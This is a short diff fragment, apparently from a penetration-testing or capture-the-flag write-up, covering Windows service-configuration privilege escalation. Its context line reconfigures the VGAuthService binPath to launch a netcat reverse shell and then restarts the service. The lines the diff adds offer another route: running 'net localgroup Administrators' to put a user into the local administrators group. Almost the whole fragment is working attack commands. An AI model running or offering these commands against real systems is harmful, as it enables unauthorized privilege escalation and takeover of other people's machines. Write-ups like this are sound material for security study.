@@ -39,3 +39,11 @@ sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cm
 sc.exe stop VGAuthService
 sc.exe start VGAuthService
 ```
+
+Instead of a reverse shell, we can  use this:
+
+```bash
+sc.exe config VGAuthService binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+
